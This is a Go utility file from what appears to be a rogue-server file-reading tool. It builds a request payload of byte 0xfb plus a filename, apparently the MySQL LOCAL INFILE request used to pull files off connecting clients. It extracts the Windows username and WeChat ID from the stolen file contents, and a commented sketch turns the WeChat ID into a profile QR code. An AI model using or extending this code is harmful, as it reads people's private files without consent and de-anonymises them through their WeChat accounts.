package utils

import (
	"fmt"
	"regexp"
	"strings"
)

var TRBULAR = []byte{
	0xfb,
}

func GetPayload(filename string) []byte {

	filebyte := []byte(filename)

	// 预先分配足够的容量
	combined := make([]byte, 0, len(TRBULAR)+len(filebyte))

	// 追加 slice1 和 slice2
	combined = append(combined, TRBULAR...)
	combined = append(combined, filebyte...)

	return combined
}

func GetUserName(content string) string {

	return findStr(content, `Users\\(.*)\\`)

}

func GetWechatId(content string) string {

	return findStr(content, `WeChatFiles\\(.*)\\config`)

}

func findStr(content, reg string) string {

	// 替换字符串中的字符
	content = strings.Replace(content, "\n", "", -1)
	content = strings.Replace(content, "\r", "", -1)
	content = strings.Replace(content, " ", "", -1)
	content = strings.Replace(content, "\t", "", -1)
	content = strings.Replace(content, "\000", "", -1) // 注意Go中的NULL字符是\000而不是\00

	// 定义正则表达式模式
	re := regexp.MustCompile(reg)

	// 使用FindStringSubmatch找到匹配的字符串
	matches := re.FindStringSubmatch(content)

	if len(matches) > 1 {
		// matches[1] 是第一个括号内匹配的内容，即用户的用户名
		res := matches[1]

		// 使用split分割字符串
		usernameParts := strings.Split(res, "\\")

		if len(usernameParts) > 0 {
			// 获取用户名，假设用户名是分割后的第一个部分
			username := usernameParts[0]
			fmt.Println("find:", username)

			return username
		}
	}
	fmt.Println("not find")

	return ""

}

// qr_id = "weixin://contacts/profile/" + wechatId
// qr = qrcode.QRCode(
// 	version=4,
// 	error_correction=qrcode.constants.ERROR_CORRECT_M,
// 	box_size=10,
// 	border=2,
// )
